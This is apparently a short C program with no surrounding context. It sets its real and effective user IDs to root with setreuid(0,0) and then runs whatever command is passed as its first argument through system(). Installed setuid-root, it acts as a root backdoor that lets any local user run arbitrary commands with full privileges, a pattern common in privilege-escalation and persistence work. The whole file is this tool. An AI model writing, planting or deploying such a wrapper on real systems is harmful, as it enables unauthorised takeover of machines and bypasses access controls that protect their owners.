#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
   setreuid(0,0);
   if ( argc == 2 )
      system(argv[1]);
   return 0;
}

